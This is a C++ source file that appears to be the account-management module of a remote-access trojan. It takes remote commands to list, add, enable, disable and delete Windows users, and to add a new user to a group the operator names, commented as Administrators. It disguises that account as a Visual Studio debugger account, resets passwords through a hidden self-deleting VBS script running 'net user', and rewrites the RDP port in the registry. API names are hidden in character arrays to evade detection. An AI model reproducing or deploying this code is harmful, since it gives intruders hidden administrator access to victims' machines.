// SerManager.cpp: implementation of the CSerManager class.
//
//////////////////////////////////////////////////////////////////////

#include "../stdafx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include "ServerStart.h"
#include "until.h"
#include "tlhelp32.h"
#include "SystemManager.h"
#include  <atlbase.h>  
#include "../Myfunction.h"  //�Զ��庯��

extern Myfunction *Gyfunction;
//////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////

CServerStart::CServerStart(CClientSocket *pClient) : CManager(pClient)
{
    SendProcessListo();  //����ˢ��
}

CServerStart::~CServerStart()
{

}

void CServerStart::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();
	switch (lpBuffer[0])
	{
	case COMMAND_USER_LIST:     //�û��б�
		SendProcessListo();
		break;
	case COMMAND_NETWORK_LIST:  //�����б� 0
		SendWindowsListo();
		break;
	case COMMAND_NET_YHSX:      //�û�ˢ�� 0  
		SendProcessListo();
		break;
	case COMMAND_NET_USER:         //�ʻ�����
		getuseAdd((LPBYTE)lpBuffer + 1, nSize - 1);  
		break;
	case COMMAND_NET_START:		   //�ʻ�����
		SendNetstart((LPBYTE)lpBuffer + 1, nSize - 1, NULL);  
		break;
	case COMMAND_NET_DISABLE:	   //�ʻ�����
		SendNetstart((LPBYTE)lpBuffer + 1, nSize - 1, TRUE);  
		break;
	case COMMAND_NET_DEL:          //�ʻ�ɾ��
		SendNetsDele((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_RENAME_PASSWORD:  //�����޸�
		SendNetsPassword((LPBYTE)lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_SERVER_PORT:      //�˿��޸�
		SendNetsPassPort((LPBYTE)lpBuffer + 1, nSize - 1);
		break;

	default:
		break;
	}
}

void CServerStart::SendProcessListo()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessListo();
	if (lpBuffer == NULL)
		return;

	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(lpBuffer);
}

void CServerStart::SendWindowsListo()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getWindowsListo();
	if (lpBuffer == NULL)
		return;

	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	Send((LPBYTE)lpBuffer, pLocalSize(lpBuffer));
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(lpBuffer);	
}

/////////////////////////////////////////////////// CMD���к���  �û������޸�
void CMD_Function(char *NetName,char *NetPass)
{
	HANDLE hFile;
	DWORD dwWritten;

	char name[]="jingtisanmenxiachuanxiao.vbs";
	char cmdline[256]={0};
	
	char RdNyz00[] = {'d','i','m',' ','w','s','h','\0'};
	char RdNyz01[] = {'s','e','t',' ','w','s','h','=','c','r','e','a','t','e','O','b','j','e','c','t','(','"','W','S','c','r','i','p','t','.','S','h','e','l','l','"',')','\0'};
	char RdNyz02[] = {'w','s','h','.','r','u','n',' ','"','n','e','t',' ','u','s','e','r',' ','\0'};
	char RdNyz03[] = {'"',',','0','\0'};
	char RdNyz04[] = {'c','r','e','a','t','e','o','b','j','e','c','t','(','"','s','c','r','i','p','t','i','n','g','.','f','i','l','e','s','y','s','t','e','m','o','b','j','e','c','t','"',')','.','d','e','l','e','t','e','f','i','l','e',' ','w','s','c','r','i','p','t','.','s','c','r','i','p','t','f','u','l','l','n','a','m','e','\0'};
/*
dim wsh 
set wsh=createObject("WScript.Shell")
wsh.run "net user �û��� ����",0
createobject("scripting.filesystemobject").deletefile wscript.scriptfullname
*/
	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateFileA");
	WriteFileT pWriteFile=(WriteFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WriteFile");
	char JtQBs02[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JtQBs02);

	Gyfunction->my_sprintf(cmdline,"%s\n\r%s\n\r%s%s %s%s\n\r%s",RdNyz00,RdNyz01,RdNyz02,NetName,NetPass,RdNyz03,RdNyz04);
	hFile=pCreateFileA(name,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	pWriteFile(hFile,(LPCVOID)cmdline,sizeof(cmdline),&dwWritten,NULL);
	pCloseHandle(hFile);
//	WinExec(name,SW_HIDE);

	char DYrEN27[] = {'S','h','e','l','l','E','x','e','c','u','t','e','A','\0'};
    ShellExecuteAT pShellExecuteA=(ShellExecuteAT)GetProcAddress(LoadLibrary("SHELL32.dll"),DYrEN27);
	pShellExecuteA(NULL,"open",name,NULL,NULL,SW_HIDE);
 }

void CServerStart::SendNetsPassword(LPBYTE lpBuffer, UINT nSize)   //�ʻ������޸�
{
	wchar_t user_name[256]={0};

	char	*DisplayName=NULL;
	char	*ServicePass=NULL;
	DWORD	dwOffset = 0;

	DisplayName = (char *)lpBuffer + dwOffset;
	char JYvni01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JYvni01);
	ServicePass = DisplayName + plstrlenA(DisplayName) +1;

	CMD_Function(DisplayName,ServicePass);  //ͨ��vbs�ļ���CMD���޸�����
}

void CServerStart::SendNetsDele(LPBYTE lpBuffer, UINT nSize)   //�ʻ�ɾ��
{
	wchar_t user_name[256]={0};

	mbstowcs(user_name, (const char *)lpBuffer,256);
//	NetUserDel(NULL,user_name);  //
	char DYrEN06[] = {'N','e','t','U','s','e','r','D','e','l','\0'};
	NetUserDelT pNetUserDel=(NetUserDelT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN06);
	pNetUserDel(NULL,user_name);  //

	// ����Sleep�£���ֹ����
	SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"Sleep");
	pSleep(100);
	// ˢ���û��б�
	SendProcessListo();
	// ˢ�������б�
//	SendWindowsListo();	
}

void CServerStart::SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt)  //�ʻ�����/ͣ��
{
	wchar_t user_name[256]={0};
	USER_INFO_1008 ui;
	DWORD dwLevel = 1008;

	mbstowcs(user_name, (const char *)lpBuffer,256);

	if(User_kt==NULL)  //�û�����
	{
	    ui.usri1008_flags = UF_SCRIPT|UF_DONT_EXPIRE_PASSWD;  // �û�ͣ�� | �����ò�����
	}
	else  //�û�ͣ��
	{
		ui.usri1008_flags = UF_ACCOUNTDISABLE|UF_PASSWD_CANT_CHANGE;  // �û�ͣ�� | �û����ܸ�������
	}

	char DYrEN07[] = {'N','e','t','U','s','e','r','S','e','t','I','n','f','o','\0'};
	NetUserSetInfoT pNetUserSetInfo=(NetUserSetInfoT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN07);
	pNetUserSetInfo( NULL,user_name,dwLevel, (LPBYTE )&ui,NULL);

	SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"Sleep");
	pSleep(100);
	// ˢ���û��б�
	SendProcessListo();
}

static int nuser=0;
char user_all[50][50]={0};
inline int get_all_user(void) //�õ��û�   
{   
    LPUSER_INFO_0   pBuf   =   NULL;   
    LPUSER_INFO_0   pTmpBuf;   
    DWORD   dwLevel   =   0;   
    DWORD   dwPrefMaxLen   =   MAX_PREFERRED_LENGTH;   
    DWORD   dwEntriesRead   =   0;   
    DWORD   dwTotalEntries   =   0;   
    DWORD   dwResumeHandle   =   0;   
    NET_API_STATUS   nStatus;   

	char DYrEN08[] = {'N','e','t','A','p','i','B','u','f','f','e','r','F','r','e','e','\0'};
	NetApiBufferFreeT pNetApiBufferFree=(NetApiBufferFreeT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN08);
	char DYrEN09[] = {'N','e','t','U','s','e','r','E','n','u','m','\0'};
	NetUserEnumT pNetUserEnum=(NetUserEnumT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN09);
    do   
	{   
        nStatus   =   pNetUserEnum(NULL,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);   
    
        if((nStatus   ==   NERR_Success)   ||   (nStatus   ==   ERROR_MORE_DATA))   
		{   
            if((pTmpBuf=pBuf)!=NULL)   
			{   
                for(DWORD   i=0;i<dwEntriesRead;++i)   
				{   
                    wcstombs(user_all[nuser++],pTmpBuf->usri0_name,80);   
                    pTmpBuf++;   
				}   
			}   
		}   
    
        if(pBuf!=NULL)   
		{   
            pNetApiBufferFree(pBuf);   
            pBuf   =   NULL;   
		}   
	}   
    while   (nStatus   ==   ERROR_MORE_DATA);     
    
    if(pBuf   !=   NULL)   
        pNetApiBufferFree(pBuf);   
    
    return   nuser;   
  }   

char getall_Groups(char *str_user,char Groupt[]) //�����û��õ��û���
{

	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL; 
	NET_API_STATUS nStatus;
	DWORD dwLevel = 0; 
	DWORD dwFlags = LG_INCLUDE_INDIRECT; 
	DWORD dwPrefMaxLen = -1;
    DWORD dwEntriesRead = 0; 
    DWORD dwTotalEntries = 0; 
	wchar_t user[256]={0};
	DWORD len;
	char Groups[256]={NULL};
	int strj,strp;

    size_t retlen = mbstowcs(user, (const char *)str_user,256);

	char DYrEN07[] = {'N','e','t','U','s','e','r','G','e','t','L','o','c','a','l','G','r','o','u','p','s','\0'};
	NetUserGetLocalGroupsT pNetUserGetLocalGroups=(NetUserGetLocalGroupsT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN07);
    nStatus = pNetUserGetLocalGroups(
		    NULL,
		    user,
		    dwLevel,
		    dwFlags,
		    (LPBYTE*)&pBuf,
		    dwPrefMaxLen,
		    &dwEntriesRead,
		    &dwTotalEntries); 

	char DYrEN68[] = {'w','s','p','r','i','n','t','f','A','\0'};
	wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN68);
    if(nStatus == NERR_Success) 
	{ 
        LPLOCALGROUP_USERS_INFO_0   pTmpBuf; 
        DWORD   i; 
        DWORD   dwTotalCount   =   0; 
        if((pTmpBuf = pBuf) != NULL) 
		{ 
            for(i = 0; i < dwEntriesRead;   i++) 
			{ 
                if(pTmpBuf == NULL) 
                    break; 

				char *p=NULL;
//				len = wcslen(pBuf->lgrui0_name);
				len = wcslen(pTmpBuf->lgrui0_name);
				p = (char *) malloc(len+1);

				pwsprintfA(p,"%S",pTmpBuf->lgrui0_name);
				Gyfunction->my_strncpy(Groups,p,sizeof(Groups));
				strj=strlen(Groupt);
				strp=strlen(Groups);
				if(strj!=0)
				{
					Groupt[strj]='/';
					strj++;
				}
				for(int i=0;i<strp;i++)
				{
					Groupt[strj+i]=Groups[i];
				}
                pTmpBuf++; 
                dwTotalCount++; 
			} 
		}
	}
	return 0;
}

BOOL IsGuestDisabled(char *str_user)  //�����û��õ� �û�״̬
{
  BOOL bRet = TRUE;
  LPUSER_INFO_1 puiVal = NULL;

  wchar_t user[256]={0};
  size_t retlen = mbstowcs(user, (const char *)str_user,256);

  char DYrEN09[] = {'N','e','t','U','s','e','r','G','e','t','I','n','f','o','\0'};
  NetUserGetInfoT pNetUserGetInfo=(NetUserGetInfoT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN09);
  if(NERR_Success == pNetUserGetInfo(NULL,user, 1, (LPBYTE *)&puiVal))
  {
    if(!(puiVal->usri1_flags & UF_ACCOUNTDISABLE))
    {
      bRet = FALSE;
    }
  }
  	char DYrEN08[] = {'N','e','t','A','p','i','B','u','f','f','e','r','F','r','e','e','\0'};
	NetApiBufferFreeT pNetApiBufferFree=(NetApiBufferFreeT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN08);
    if(puiVal)
	{
        pNetApiBufferFree(puiVal);
	}
    return bRet;
}

LPBYTE CServerStart::getProcessListo()
{
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;

	//�õ������û�   
	nuser=0;
    if(!get_all_user())  
		return NULL;
    //������ʼ   

	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	lpBuffer = (LPBYTE)pLocalAlloc(LPTR, 1024);
	lpBuffer[0] = TOKEN_USER_LIST;
	dwOffset = 1;

	char ReadRort[50]={NULL};
	SendNetPortRead(ReadRort);   //�˿ڶ�ȡ
    for(int i=0;i<nuser;i++)//ѭ���û�  
	{
		char Groups[256]={NULL};
		getall_Groups(user_all[i],Groups);  //�����û� �����û���
		BOOL stt=IsGuestDisabled(user_all[i]);  //�����û� �ó��û�״̬
		char *GetInfo="����";
		if(stt)
		{
			GetInfo="����";
		}

		char JYvni01[] = {'l','s','t','r','l','e','n','A','\0'};
	    lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JYvni01);
		Gyfunction->my_memcpy(lpBuffer + dwOffset, user_all[i], plstrlenA(user_all[i])+1);
		dwOffset += plstrlenA(user_all[i])+1;
		Gyfunction->my_memcpy(lpBuffer + dwOffset, Groups, plstrlenA(Groups) + 1);
		dwOffset += plstrlenA(Groups) + 1;
		Gyfunction->my_memcpy(lpBuffer + dwOffset, GetInfo, plstrlenA(GetInfo) + 1);
		dwOffset += plstrlenA(GetInfo) + 1;
	    Gyfunction->my_memcpy(lpBuffer + dwOffset, ReadRort, plstrlenA(ReadRort) + 1);
	    dwOffset += plstrlenA(ReadRort) + 1;
	}

	char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);
	lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);

	return lpBuffer;	
}

bool CALLBACK CServerStart::EnumWindowsProco(HWND hwnd, LPARAM lParam)
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	lpBuffer = *(LPBYTE *)lParam;
	
	char	strTitle[1024]={0};
	memset(strTitle, 0, sizeof(strTitle));
/*
    char CtxPW56[] = {'G','e','t','W','i','n','d','o','w','T','e','x','t','A','\0'};
    GetWindowTextAT pGetWindowTextA=(GetWindowTextAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW56);
	pGetWindowTextA(hwnd, strTitle, sizeof(strTitle));
	
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (!IsWindowVisible(hwnd) || plstrlenA(strTitle) == 0)
		return true;
	
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	if (lpBuffer == NULL)
		lpBuffer = (LPBYTE)pLocalAlloc(LPTR, 1);
	
	dwLength = sizeof(DWORD) + plstrlenA(strTitle) + 1;
	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	dwOffset = pLocalSize(lpBuffer);
	char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
	LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);
	lpBuffer = (LPBYTE)pLocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	
    char CtxPW53[] = {'G','e','t','W','i','n','d','o','w','T','h','r','e','a','d','P','r','o','c','e','s','s','I','d','\0'};
    GetWindowThreadProcessIdT pGetWindowThreadProcessId=(GetWindowThreadProcessIdT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW53);
	pGetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
	my_memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, plstrlenA(strTitle) + 1);
	
	*(LPBYTE *)lParam = lpBuffer;
	*/
	return true;
}

LPBYTE CServerStart::getWindowsListo()
{
	LPBYTE	lpBuffer = NULL;
	char DYrEN66[] = {'E','n','u','m','W','i','n','d','o','w','s','\0'};
	EnumWindowsT pEnumWindows=(EnumWindowsT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN66);
	pEnumWindows((WNDENUMPROC)EnumWindowsProco, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_WSLIST;
	return lpBuffer;	
}

void CServerStart::SendNetsPassPort(LPBYTE lpBuffer, UINT nSize)   //�˿��޸�
{
	char *strPotr=NULL;

	HKEY hk;
	char JYvni10[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','d','s','\\','r','d','p','w','d','\\','T','d','s','\\','t','c','p','\\','\0'};
	char JYvni11[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','i','n','S','t','a','t','i','o','n','s','\\','R','D','P','-','T','c','p','\\','\0'};
	LPCTSTR data_Set1=JYvni10;
	LPCTSTR data_Set2=JYvni11;

	strPotr = (char *)lpBuffer;
	DWORD dwPort=atoi(strPotr);  //ȡ������

	// 1
	RegCreateKeyAT pRegCreateKeyA=(RegCreateKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegCreateKeyA");
	RegSetValueExAT pRegSetValueExA=(RegSetValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegSetValueExA");
	pRegCreateKeyA( HKEY_LOCAL_MACHINE, data_Set1, &hk );  //��ע��� 1
	pRegSetValueExA( hk, "PortNumber", 0, REG_DWORD, (BYTE*)&dwPort, sizeof(dwPort));  //д������
	// 2
	pRegCreateKeyA( HKEY_LOCAL_MACHINE, data_Set2, &hk ); //��ע��� 2
	pRegSetValueExA( hk, "PortNumber", 0, REG_DWORD, (BYTE*)&dwPort, sizeof(dwPort));  //д������

	char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	pRegCloseKey( hk );  // �ر�ע���

	// ˢ���û��б�
	SendProcessListo();
}

void CServerStart::SendNetPortRead(char Prot[])   //�˿ڶ�ȡ
{
	DWORD dwType,Vals1,dwSize=sizeof(DWORD);
	UINT Strv0,Strv1;

	HKEY hk;
	char JYvni10[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','d','s','\\','r','d','p','w','d','\\','T','d','s','\\','t','c','p','\\','\0'};
	char JYvni11[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','C','o','n','t','r','o','l','\\','T','e','r','m','i','n','a','l',' ','S','e','r','v','e','r','\\','W','i','n','S','t','a','t','i','o','n','s','\\','R','D','P','-','T','c','p','\\','\0'};
	LPCTSTR data_Set1=JYvni10;
	LPCTSTR data_Set2=JYvni11;

	// 1
	RegCreateKeyAT pRegCreateKeyA=(RegCreateKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegCreateKeyA");
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	pRegCreateKeyA( HKEY_LOCAL_MACHINE, data_Set1, &hk );  //��ע��� 1
	if(pRegQueryValueExA( hk, "PortNumber", NULL, &dwType, (BYTE*)&Vals1, &dwSize ) == ERROR_SUCCESS )   //��ȡ����
	{
		Strv0=Vals1;
	}
	// 2
	pRegCreateKeyA( HKEY_LOCAL_MACHINE, data_Set2, &hk ); //��ע��� 2
	if(pRegQueryValueExA( hk, "PortNumber", NULL, &dwType, (BYTE*)&Vals1, &dwSize ) == ERROR_SUCCESS )  //д������
	{
		Strv1=Vals1;
	}

	char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	pRegCloseKey( hk );  // �ر�ע���

	char dwPort[50]={0};
	if(Strv0==Strv1)   //���˿���ͬ
	{
        Gyfunction->my_sprintf(Prot,"%d",Strv0);  //������ת�����ַ���
	}
	else  //���˿ڴ���
	{
		Gyfunction->my_sprintf(Prot,"%d/%d",Strv0,Strv1);  //������ת�����ַ���
	}

}

void CServerStart::getuseAdd(LPBYTE lpBuffer, UINT nSize)   //�ʻ�����
{
	char *strName=NULL;
	char *strPass=NULL;
	char *strGroup=NULL;
	DWORD	dwOffset = 0;

	strName = (char *)lpBuffer + dwOffset;
	char JYvni01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JYvni01);
	strPass = strName + plstrlenA(strName) +1;
	strGroup = strPass + plstrlenA(strPass) +1;

	DWORD dwLevel = 1;
	USER_INFO_1 ui; 
	DWORD dwError = 0;
	USES_CONVERSION;
	LPWSTR name = A2W(strName);
	LPWSTR pwd = A2W(strPass);
	LPWSTR Administrators = A2W(strGroup);
	ui.usri1_name =(WCHAR * )name;      //�����Ҫ��ӵ��û����������Լ��ĸ�
	ui.usri1_password =(WCHAR * )pwd;   //������û����룬Ҳ�����Լ��ĸ�
	ui.usri1_priv = USER_PRIV_USER; 
	ui.usri1_home_dir = NULL; //����·��
	ui.usri1_comment =L"This user account is used by the Visual Studio .NET Debugger";// ����
	ui.usri1_flags = UF_SCRIPT; 
	ui.usri1_script_path = NULL; //��½�ű�  

	char DYrEN11[] = {'N','e','t','U','s','e','r','A','d','d','\0'};
	NetUserAddT pNetUserAdd=(NetUserAddT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN11);
	pNetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
	wchar_t szAccountName[100]={0};
	wcscpy(szAccountName,ui.usri1_name); 
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname=szAccountName; 
	//��ӵ�Administrators��
	char DYrEN10[] = {'N','e','t','L','o','c','a','l','G','r','o','u','p','A','d','d','M','e','m','b','e','r','s','\0'};
	NetLocalGroupAddMembersT pNetLocalGroupAddMembers=(NetLocalGroupAddMembersT)GetProcAddress(LoadLibrary("NETAPI32.dll"),DYrEN10);
	pNetLocalGroupAddMembers(NULL,Administrators,3,(LPBYTE)&account,1);
	SendProcessListo();  //�û�ˢ��

}
